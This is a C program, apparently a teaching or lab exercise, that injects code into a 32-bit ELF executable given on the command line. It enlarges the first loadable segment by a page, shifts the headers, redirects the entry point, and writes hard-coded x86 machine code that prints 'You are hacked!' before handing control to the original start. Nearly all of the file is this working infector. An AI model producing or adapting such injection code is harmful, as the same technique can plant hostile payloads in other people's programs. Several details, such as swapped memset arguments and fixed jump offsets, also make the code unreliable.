#include "stdio.h"
#include "string.h"
#include "../include/elf.h"

#define  PAGESIZE  4096
void cal_addr(int addr, int addrstr[]);
void inject(char *);
void insert(Elf32_Ehdr elf_ehdr, int fd, const char*filename, int start);


void cal_addr(int addr, int addrstr[]){ 
	int temp = addr;
	for(int i = 0; i < 4; i ++) {
		addrstr[i] = temp % 256; // 8 bit max num = 255
		temp /= 256;
	}
}

void inject(char *filename) {

    Elf32_Ehdr elf_ehdr;
    Elf32_Phdr elf_phdr;
    Elf32_Shdr elf_shdr;
    /*
	        elf file layout
        ------------------------------
                elf header
        ------------------------------
            Program_header arrays
        ------------------------------
                Section arrays
        ------------------------------
            section_header arrays
        ------------------------------

    */


	int new_main;
	int filesz;
    int load_founded = 0;
    int fd = open(filename, O_RDWR);

    read(fd, &elf_ehdr, sizeof(elf_ehdr));
 	int shoff = elf_ehdr.e_shoff;
    elf_ehdr.e_shoff += PAGESIZE;

    // alter the program meta-info. 
    // One additional page is after the former first page
    for(int i = 0; i < elf_ehdr.e_phnum; i ++) {
        mylseek(fd, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
        read(fd, &elf_phdr, sizeof(elf_phdr));
        if (load_founded) {
            // one new page have been added to the first program section
            // the following program sections' start should be laid off.
            elf_phdr.p_offset += PAGESIZE;
            // renew the change
            mylseek(fd, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
            write(fd, &elf_phdr, sizeof(elf_phdr));

        } else if(PT_LOAD == elf_phdr.p_type){
			//new <_start>
           //	elf_ehdr.e_entry = elf_phdr.p_offset + elf_phdr.p_filesz + 30; 
			elf_ehdr.e_entry += elf_phdr.p_filesz;
            mylseek(fd, 0, SEEK_SET);
            write(fd, &elf_ehdr, sizeof(elf_ehdr));
			filesz = elf_phdr.p_filesz;
			new_main = elf_phdr.p_offset + elf_phdr.p_filesz;
            elf_phdr.p_filesz += PAGESIZE;
            elf_phdr.p_memsz += PAGESIZE;
            mylseek(fd, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
            write(fd, &elf_phdr, sizeof(elf_phdr));

            load_founded = 1;
        }

    }


	 // alter the section meta-info
    for(int i = 0; i < elf_ehdr.e_shnum; i ++) {
        mylseek(fd, shoff + i * elf_ehdr.e_shentsize, SEEK_SET);
        read(fd, &elf_shdr, sizeof(elf_shdr));

		// .text section
        if (i == 0) {
            elf_shdr.sh_size += PAGESIZE;
        } else {
            elf_shdr.sh_offset += PAGESIZE;
        }
        mylseek(fd, shoff + i * elf_ehdr.e_shentsize, SEEK_SET);
        write(fd, &elf_shdr, sizeof(elf_shdr));
    }
	
   
    insert(elf_ehdr, fd, filename, new_main);
}


void insert(Elf32_Ehdr elf_ehdr, int fd, const char*filename, int start)
{
		int data_addr[4];
		cal_addr(62 + start, data_addr);
		
        char injected_code[] = {
			// <main>
			0x8d, 0x4c, 0x24, 0x04,
			0x83, 0xe4, 0xf0,
			0xff, 0x71, 0xfc,
			0x55,
			0x89, 0xe5,
			0x51,
			0x83, 0xec, 0x04,
			0x83, 0xec, 0x0c,
			0x68, data_addr[0],data_addr[1],data_addr[2],data_addr[3],
			//0x68, 0x68, 0x17, 0x00, 0x00,
			0xe8, 0xF0, 0xF5, 0xFF, 0xFF,
			0x83, 0xc4, 0x10,
			0xb8, 0x00, 0x00, 0x00, 0x00,
			0x8b, 0x4d, 0xfc,
			0xc9,
			0x8d, 0x61, 0xfc,
			0xc3,
			0x66, 0x90,
			// <_start>
			0x50, //push %eax
			0x51, //push %ecx
			0xe8, 0xc9, 0xff, 0xff, 0xff, //new <_main> position
			0x50,
			0xe9, 0x88, 0xfc, 0xff, 0xff,
			0xf4
		};
		char injected_str[] = "You are hacked!\n";
        int injected_size = sizeof(injected_code);
        if (injected_size > PAGESIZE) {
            printf("Injecting too much bytes. Injection Failure.\n");
            exit(0);
        }

        // get the total length of the elf file
        struct stat file_stat;
        stat(filename, &file_stat);


        char data_buf[PAGESIZE];
        int current_pos = start;
        // change the layout of the elf file
		while(current_pos + PAGESIZE < file_stat.st_size) {
				current_pos += PAGESIZE;
		}
        mylseek(fd, current_pos, SEEK_SET);
        read(fd, data_buf + (PAGESIZE - file_stat.st_size + current_pos), file_stat.st_size - current_pos);
        mylseek(fd, 0, SEEK_END);
        write(fd, data_buf, PAGESIZE);
        for(current_pos -= PAGESIZE;current_pos >= start; current_pos -= PAGESIZE){
            mylseek(fd, current_pos, SEEK_SET);
            read(fd, data_buf, PAGESIZE);
            mylseek(fd, current_pos + PAGESIZE, SEEK_SET);
            write(fd, data_buf, PAGESIZE);
			printf("%d --> %d\n", current_pos, current_pos + PAGESIZE);
        }
		

        // do inject
        mylseek(fd, start, SEEK_SET);
        write(fd, injected_code, injected_size);
        char temp[PAGESIZE];
		memset(temp, PAGESIZE, 0);
		//mylseek(fd, start + injected_size, SEEK_SET);
        write(fd, injected_str, sizeof(injected_str));
		write(fd, temp, PAGESIZE - injected_size - sizeof(injected_str));

        printf("Inject Finished.\n");
}






int main(int argc, char ** argv)
{
	if (argc != 2) {
		printf("Please enter the target elf file that you want to attack.\n");
		exit(0);
	}
	inject(argv[1]);
	return 0;
}
